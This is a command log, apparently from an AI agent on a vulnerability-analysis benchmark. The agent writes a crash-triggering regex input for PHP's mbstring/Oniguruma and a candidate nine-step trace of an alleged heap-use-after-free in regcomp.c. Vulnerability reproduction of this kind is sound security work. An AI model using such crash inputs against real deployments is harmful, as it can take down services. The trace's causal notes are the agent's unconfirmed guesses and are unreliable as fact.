message:
Command `cd /workspace/repo-vul/src-vul/php-src && python3 - <<'PY'
from pathlib import Path
Path('/workspace/poc.bin').write_bytes(b'((a?){1,2})*')
trace='''[
  {"step":1,"file":"sapi/fuzzer/fuzzer-mbstring.c","function":"LLVMFuzzerTestOneInput","line":22,"var":"data","code":"memcpy(data, Data, Size); data[Size] = '\\0';","note":"The raw fuzzer bytes become a NUL-terminated attacker-controlled regex pattern."},
  {"step":2,"file":"sapi/fuzzer/fuzzer-mbstring.c","function":"LLVMFuzzerTestOneInput","line":27,"var":"args[0]","code":"args[0] = data; fuzzer_call_php_func(\"mb_ereg\", 2, args);","note":"The pattern is passed directly into mb_ereg as the regex argument."},
  {"step":3,"file":"ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_replace_exec","line":1077,"var":"re","code":"php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, options, MBREX(current_mbctype), syntax)","note":"mbstring compiles the attacker pattern into an Oniguruma regex object."},
  {"step":4,"file":"oniguruma/src/regcomp.c","function":"tune_tree","line":7035,"var":"root","code":"r = tune_tree(root, reg, 0, &scan_env);","note":"Regex compilation recursively tunes the AST and reaches quantified subexpressions."},
  {"step":5,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5458,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"For an empty-repeat candidate, the compiler classifies the quantifier body before finishing tuning."},
  {"step":6,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4894,"var":"node","code":"static enum BodyEmptyType quantifiers_memory_node_info(Node* node)","note":"The emptiness classifier recursively walks the quantifier body graph."},
  {"step":7,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4947,"var":"en->te.Then","code":"v = quantifiers_memory_node_info(en->te.Then);","note":"Conditional branches are followed during the recursive walk, touching reused AST nodes."},
  {"step":8,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4953,"var":"en->te.Else","code":"v = quantifiers_memory_node_info(en->te.Else);","note":"The alternate branch is also traversed, which is where the stale node reference is later observed."},
  {"step":9,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4969,"var":"return r","code":"return r;","note":"The traversal returns after dereferencing the freed node, matching the ASAN heap-use-after-free read."}
]'''
Path('/workspace/candidate_trace.json').write_text(trace)
PY
python3 -c 'import pathlib; print(pathlib.Path("/workspace/candidate_trace.json").read_text())'` executed with exit code 0.
